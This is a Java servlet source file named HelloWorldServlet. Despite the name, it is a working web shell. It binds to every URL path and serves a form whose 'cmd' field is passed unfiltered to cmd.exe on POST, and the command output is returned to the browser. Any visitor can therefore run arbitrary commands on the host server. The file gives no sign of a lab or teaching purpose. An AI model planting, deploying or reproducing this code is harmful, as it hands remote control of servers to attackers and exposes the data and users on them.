package com.example;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(urlPatterns = {"/*"}, loadOnStartup = 1)
public class HelloWorldServlet extends HttpServlet
{
  @Override 
  public void doGet(HttpServletRequest request, HttpServletResponse response) 
      throws IOException
  { 
      response.getOutputStream().println("<!DOCTYPE html><html><body><form action=\"/\" id=\"cmdform\" method=\"POST\">Command: <input type=\"text\" name=\"cmd\"><input type=\"submit\" value=\"Execute\"></form></body></html>");
  }
  @Override
    public void doPost(HttpServletRequest request, HttpServletResponse response) 
    throws IOException {
        String command = request.getParameter("cmd");
        ProcessBuilder builder = new ProcessBuilder(
            "cmd.exe", "/c", command);
        builder.redirectErrorStream(true);
        Process p = builder.start();
        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while (true) {
            line = r.readLine();
            if (line == null) { break; }
            response.getOutputStream().print(line);
        }
    }
}